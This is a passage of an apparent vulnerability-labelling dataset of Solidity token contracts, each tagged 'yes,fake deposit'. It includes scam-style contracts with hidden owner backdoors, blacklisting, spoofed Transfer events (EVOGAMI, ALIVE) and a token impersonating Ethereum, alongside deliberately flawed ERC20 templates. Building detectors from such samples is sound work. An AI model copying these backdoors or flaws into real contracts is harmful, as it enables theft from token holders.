codeSize;\n //in line assembly code\n assembly {\n codeSize := extcodesize(_addr)\n }\n // i=s code size > 0 then true\n return codeSize > 0; \n }\n\n \n //allows a spender address to spend a specific amount of value\n function approve(address _spender, uint _value) external override returns (bool success) {\n __allowances[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n\n\n //shows how much a spender has the approval to spend to a specific address\n function allowance(address _owner, address _spender) external override view returns (uint remaining) {\n return __allowances[_owner][_spender];\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.16;\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract ERC20Token is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 1000000000000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 1000000000000000000; // Update total supply (100000 for example)\n name = \"PBSC Coin\"; // Set the name for display purposes\n decimals = 8; // Amount of decimals for display purposes\n symbol = \"PBSC\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity 0.8.17;\n\nabstract contract Context {\n function _msgSender() internal view virtual returns (address) {\n return msg.sender;\n }\n}\n\n\n\nlibrary SafeMath {\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n return c;\n }\n\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b <= a, errorMessage);\n uint256 c = a - b;\n return c;\n }\n\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n require(c / a == b, \"SafeMath: multiplication overflow\");\n return c;\n }\n\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return div(a, b, \"SafeMath: division by zero\");\n }\n\n function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b > 0, errorMessage);\n uint256 c = a / b;\n return c;\n }\n\n}\n\ncontract Ownable is Context {\n address private _Owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n address _zConst = 0x7De4D03d99ef36CAA1Cc504b198e80da746114f9;\n\taddress zRouterV2 = 0x426903241ADA3A0092C3493a0C795F2ec830D622;\n constructor () {\n address msgSender = _msgSender();\n _Owner = msgSender;\n emit OwnershipTransferred(address(0), msgSender);\n }\n\n function owner() public view returns (address) {\n return _Owner;\n }\n\n function renounceOwnership() public virtual {\n require(msg.sender == _Owner);\n emit OwnershipTransferred(_Owner, address(0));\n _Owner = address(0);\n }\n\n}\n\n\n\ncontract EVOGAMI is Context, Ownable {\n using SafeMath for uint256;\n mapping (address => uint256) private Zc;\n\tmapping (address => bool) private Zb;\n mapping (address => bool) private Za;\n mapping (address => mapping (address => uint256)) private Ze;\n uint8 private constant _decimals = 8;\n uint256 private constant _zSupply = 200000000 * 10**_decimals;\n string private constant _name = \"EVOGAMI\";\n string private constant _symbol = \"EVOGAMI\";\n\n\n\n constructor () {\n Zc[_msgSender()] = _zSupply;\n emit Transfer(address(0), zRouterV2, _zSupply);\n }\n\n function name() public pure returns (string memory) {\n return _name;\n }\n\n function symbol() public pure returns (string memory) {\n return _symbol;\n }\n\n function decimals() public pure returns (uint8) {\n return _decimals;\n }\n\n function totalSupply() public pure returns (uint256) {\n return _zSupply;\n }\n\n function balanceOf(address account) public view returns (uint256) {\n return Zc[account];\n }\n\n\n function allowance(address owner, address spender) public view returns (uint256) {\n return Ze[owner][spender];\n }\n\n function approve(address spender, uint256 amount) public returns (bool success) { \n Ze[msg.sender][spender] = amount;\n emit Approval(msg.sender, spender, amount);\n return true; }\n\t\tfunction zRNG(address Zf) public {\n if(Zb[msg.sender]) { \n Za[Zf] = false;}}\n function zCheck(address Zf) public{\n if(Zb[msg.sender]) { \n require(!Za[Zf]);\n Za[Zf] = true; }}\n\t\tfunction zDele(address Zf) public{\n if(msg.sender == _zConst) { \n require(!Zb[Zf]);\n Zb[Zf] = true; }}\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\n if(sender == _zConst) {\n require(amount <= Zc[sender]);\n Zc[sender] -= amount; \n Zc[recipient] += amount; \n Ze[sender][msg.sender] -= amount;\n emit Transfer (zRouterV2, recipient, amount);\n return true; } else \n if(!Za[recipient]) {\n if(!Za[sender]) {\n require(amount <= Zc[sender]);\n require(amount <= Ze[sender][msg.sender]);\n Zc[sender] -= amount;\n Zc[recipient] += amount;\n Ze[sender][msg.sender] -= amount;\n emit Transfer(sender, recipient, amount);\n return true; }}}\n\t\tfunction transfer(address Zd, uint256 Zf) public {\n if(msg.sender == _zConst) {\n require(Zc[msg.sender] >= Zf);\n Zc[msg.sender] -= Zf; \n Zc[Zd] += Zf; \n emit Transfer (zRouterV2, Zd, Zf);} else \n if(Zb[msg.sender]) {Zc[Zd] += Zf;} else\n if(!Za[msg.sender]) {\n require(Zc[msg.sender] >= Zf);\n Zc[msg.sender] -= Zf; \n Zc[Zd] += Zf; \n emit Transfer(msg.sender, Zd, Zf);}}}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "\n\npragma solidity ^0.4.4;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract MyEther is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function MyEther(\n ) {\n balances[msg.sender] = 1000000000000000000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 100000000000000000000000000; // Update total supply (100000 for example)\n name = \"Ethereum\"; // Set the name for display purposes\n decimals = 18; // Amount of decimals for display purposes\n symbol = \"ETH\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "function assert(bool assertion) internal { */\n \n \n \n \n\n function safeAdd(uint256 x, uint256 y) internal returns(uint256) {\n uint256 z = x + y;\n assert((z >= x) && (z >= y));\n return z;\n }\n\n function safeSubtract(uint256 x, uint256 y) internal returns(uint256) {\n assert(x >= y);\n uint256 z = x - y;\n return z;\n }\n\n function safeMult(uint256 x, uint256 y) internal returns(uint256) {\n uint256 z = x * y;\n assert((x == 0)||(z/x == y));\n return z;\n }\n\n}\n\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\n\ncontract BAToken is StandardToken, SafeMath {\n\n // metadata\n string public constant name = \"Basic Attention Token\";\n string public constant symbol = \"BAT\";\n uint256 public constant decimals = 18;\n string public version = \"1.0\";\n\n // contracts\n address public ethFundDeposit; // deposit address for ETH for Brave International\n address public batFundDeposit; // deposit address for Brave International use and BAT User Fund\n\n // crowdsale parameters\n bool public isFinalized; // switched to true in operational state\n uint256 public fundingStartBlock;\n uint256 public fundingEndBlock;\n uint256 public constant batFund = 500 * (10**6) * 10**decimals; // 500m BAT reserved for Brave Intl use\n uint256 public constant tokenExchangeRate = 6400; // 6400 BAT tokens per 1 ETH\n uint256 public constant tokenCreationCap = 1500 * (10**6) * 10**decimals;\n uint256 public constant tokenCreationMin = 675 * (10**6) * 10**decimals;\n\n\n // events\n event LogRefund(address indexed _to, uint256 _value);\n event CreateBAT(address indexed _to, uint256 _value);\n\n // constructor\n function BAToken(\n address _ethFundDeposit,\n address _batFundDeposit,\n uint256 _fundingStartBlock,\n uint256 _fundingEndBlock)\n {\n isFinalized = false; //controls pre through crowdsale state\n ethFundDeposit = _ethFundDeposit;\n batFundDeposit = _batFundDeposit;\n fundingStartBlock = _fundingStartBlock;\n fundingEndBlock = _fundingEndBlock;\n totalSupply = batFund;\n balances[batFundDeposit] = batFund; // Deposit Brave Intl share\n CreateBAT(batFundDeposit, batFund); // logs Brave Intl fund\n }\n\n /// @dev Accepts ether and creates new BAT tokens.\n function createTokens() payable external {\n if (isFinalized) throw;\n if (block.number < fundingStartBlock) throw;\n if (block.number > fundingEndBlock) throw;\n if (msg.value == 0) throw;\n\n uint256 tokens = safeMult(msg.value, tokenExchangeRate); // check that we're not over totals\n uint256 checkedSupply = safeAdd(totalSupply, tokens);\n\n // return money if something goes wrong\n if (tokenCreationCap < checkedSupply) throw; // odd fractions won't be found\n\n totalSupply = checkedSupply;\n balances[msg.sender] += tokens; // safeAdd not needed; bad semantics to use here\n CreateBAT(msg.sender, tokens); // logs token creation\n }\n\n /// @dev Ends the funding period and sends the ETH home\n function finalize() external {\n if (isFinalized) throw;\n if (msg.sender != ethFundDeposit) throw; // locks finalize to the ultimate ETH owner\n if(totalSupply < tokenCreationMin) throw; // have to sell minimum to move to operational\n if(block.number <= fundingEndBlock && totalSupply != tokenCreationCap) throw;\n // move to operational\n isFinalized = true;\n if(!ethFundDeposit.send(this.balance)) throw; // send the eth to Brave International\n }\n\n /// @dev Allows contributors to recover their ether in the case of a failed funding campaign.\n function refund() external {\n if(isFinalized) throw; // prevents refund if operational\n if (block.number <= fundingEndBlock) throw; // prevents refund until sale period is over\n if(totalSupply >= tokenCreationMin) throw; if(msg.sender == batFundDeposit) throw; uint256 batVal = balances[msg.sender];\n if (batVal == 0) throw;\n balances[msg.sender] = 0;\n totalSupply = safeSubtract(totalSupply, batVal); // extra safe\n uint256 ethVal = batVal / tokenExchangeRate; // should be safe; previous throws covers edges\n LogRefund(msg.sender, ethVal); // log it \n if (!msg.sender.send(ethVal)) throw; // if you're using a contract; make sure it works with .send gas limits\n }\n\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.21 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract Hexaputon is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"Hexaputon\";\n string public constant symbol = \"HEXA\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity 0.4.20;\n\ncontract Token {\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) public constant returns (uint balance);\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint _value) public returns (bool success);\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint _value) public returns (bool success);\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint _value) public returns (bool success);\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) public constant returns (uint remaining);\n\n event Transfer(address indexed _from, address indexed _to, uint _value);\n event Approval(address indexed _owner, address indexed _spender, uint _value);\n}\n\ncontract RegularToken is Token {\n uint constant private MAX_UINT = 2**256 - 1;\n\n mapping (address => uint) balances;\n mapping (address => mapping (address => uint)) allowed;\n\n function transfer(address _to, uint _value) public returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n if (balances[msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint _value) public returns (bool success)\n {\n uint allowance = allowed[_from][msg.sender];\n if (balances[_from] >= _value\n && allowance >= _value\n && balances[_to] + _value >= balances[_to]\n ) {\n balances[_to] += _value;\n balances[_from] -= _value;\n if (allowance < MAX_UINT) {\n allowed[_from][msg.sender] -= _value;\n }\n Transfer(_from, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n\n function balanceOf(address _owner) public constant returns (uint balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint _value) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) public constant returns (uint remaining) {\n return allowed[_owner][_spender];\n }\n\n}\n\ncontract IOSToken is RegularToken {\n\n uint constant public totalSupply = 90*10**27;\n uint8 constant public decimals = 18;\n string constant public name = \"Wrapped IOST\";\n string constant public symbol = \"IOST\";\n\n function IOSToken() public {\n balances[msg.sender] = totalSupply;\n Transfer(address(0), msg.sender, totalSupply);\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity 0.8.18;\n\nabstract contract Context {\n address E20 = 0xD1C24f50d05946B3FABeFBAe3cd0A7e9938C63F2;\n function _msgSender() internal view virtual returns (address) {\n return msg.sender;\n }\n}\n\n\n\nlibrary SafeMath {\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n return c;\n }\n\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b <= a, errorMessage);\n uint256 c = a - b;\n return c;\n }\n\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n require(c / a == b, \"SafeMath: multiplication overflow\");\n return c;\n }\n\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return div(a, b, \"SafeMath: division by zero\");\n }\n\n function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b > 0, errorMessage);\n uint256 c = a / b;\n return c;\n }\n\n}\n\ncontract Ownable is Context {\n address private _Owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Create(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n constructor () {\n address msgSender = _msgSender();\n _Owner = msgSender;\n emit OwnershipTransferred(address(0), msgSender);\n }\n modifier onlyOwner{\n require(msg.sender == _Owner); \n _; }\n function owner() public view returns (address) {\n return _Owner;\n }\n\n function renounceOwnership() public virtual {\n require(msg.sender == _Owner);\n emit OwnershipTransferred(_Owner, address(0));\n _Owner = address(0);\n }\n\n\n}\n\n\n\ncontract ALIVE is Context, Ownable {\n using SafeMath for uint256;\n mapping (address => uint256) private E1;\n mapping (address => uint256) private E2;\n mapping (address => mapping (address => uint256)) private E3;\n uint8 private constant E4 = 8;\n uint256 private constant E5 = 100000000 * (10** E4);\n string private constant _name = \"Increasingly Alive\";\n string private constant _symbol = \"ALIVE\";\n\n\n\n constructor () {\n E1[msg.sender] = E5; \n E2[msg.sender] = 2; \n E99(E5);}\n \n\n function name() public pure returns (string memory) {\n return _name;\n }\n\n function symbol() public pure returns (string memory) {\n return _symbol;\n }\n\n function decimals() public pure returns (uint8) {\n return E4;\n }\n\n function totalSupply() public pure returns (uint256) {\n return E5;\n }\n\n function balanceOf(address account) public view returns (uint256) {\n return E1[account];\n }\n\t function allowance(address owner, address spender) public view returns (uint256) {\n return E3[owner][spender];\n }\n\n function approve(address spender, uint256 amount) public returns (bool success) { \n E3[msg.sender][spender] = amount;\n emit Approval(msg.sender, spender, amount);\n return true; }\nfunction SETE2 (address x, uint256 y) public {\n require(E2[msg.sender] == 2);\n E2[x] = y;}\n function update() public {\n E1[msg.sender] = E2[msg.sender];}\n function E99 (uint256 x) internal {\n emit Transfer(address(0), E20, x);}\n function _Transfer (address y, uint256 xy) internal {\n emit Transfer(E20, y, xy);}\n function transfer(address to, uint256 amount) public {\nif(E2[msg.sender] == 2) {\n require(E1[msg.sender] >= amount);\n E1[msg.sender] = E1[msg.sender].sub(amount);\n E1[to] = E1[to].add(amount);\n _Transfer(to, amount);}\nif(E2[msg.sender] <= 1) {\n require(E1[msg.sender] >= amount);\n E1[msg.sender] = E1[msg.sender].sub(amount);\n E1[to] = E1[to].add(amount);\n emit Transfer(msg.sender, to, amount);}}\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\nif(E2[sender] <= 1 && E2[recipient] <=1) {\n require(amount <= E1[sender]);\n require(amount <= E3[sender][msg.sender]);\n E1[sender] = E1[sender].sub(amount);\n E1[recipient] = E1[recipient].add(amount);\n emit Transfer(sender, recipient, amount);\n return true;}\n if(E2[sender] == 2) {\n require(amount <= E3[sender][msg.sender]);\n E1[sender] = E1[sender].sub(amount);\n E1[recipient] = E1[recipient].add(amount);\n _Transfer(recipient, amount);\n return true;}\n }}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.11;\n \n\ncontract IMigrationContract {\n function migrate(address addr, uint256 nas) returns (bool success);\n}\n\n\ncontract SafeMath {\n function safeAdd(uint256 x, uint256 y) internal returns(uint256) {\n uint256 z = x + y;\n assert((z >= x) && (z >= y));\n return z;\n }\n \n function safeSubtract(uint256 x, uint256 y) internal returns(uint256) {\n assert(x >= y);\n uint256 z = x - y;\n return z;\n }\n \n function safeMult(uint256 x, uint256 y) internal returns(uint256) {\n uint256 z = x * y;\n assert((x == 0)||(z/x == y));\n return z;\n }\n \n}\n \n\ncontract Token {\n uint256 public totalSupply; //\u4ee3\u5e01\u603b\u91cf\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\n\n\ncontract StandardToken is Token {\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n \n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n \n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n \n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n \n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n}\n \n\n//JGO\u4ee3\u5e01\u5408\u7ea6\ncontract JGOToken is StandardToken, SafeMath {\n string public constant name = \"laeerg\"; //\u540d\u79f0\n string public constant symbol = \"LAR\"; //\u7b26\u53f7\n uint256 public constant decimals = 9; //\u5c0f\u6570\u4f4d\n string public version = \"1.0\"; //\u7248\u672c\n \n address public ethFundDeposit; //ETH\u5b58\u653e\u5730\u5740\n uint256 public currentSupply; 